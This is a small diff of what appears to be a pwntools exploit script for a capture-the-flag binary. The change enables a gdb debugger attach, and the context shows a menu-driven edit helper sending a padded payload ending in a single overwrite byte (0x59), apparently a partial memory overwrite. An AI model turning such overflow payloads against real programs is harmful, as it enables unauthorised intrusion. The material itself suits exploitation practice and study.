@@ -15,7 +15,7 @@ def edit(pay):
     sh.sendlineafter(b"Input new comment >>", pay)
 def show():
     cmd(2)
-# gdb.attach(sh)
+gdb.attach(sh)
 
 payload=b'wohaonij'+b'wohaonij'+b'\x59'
 edit(payload)
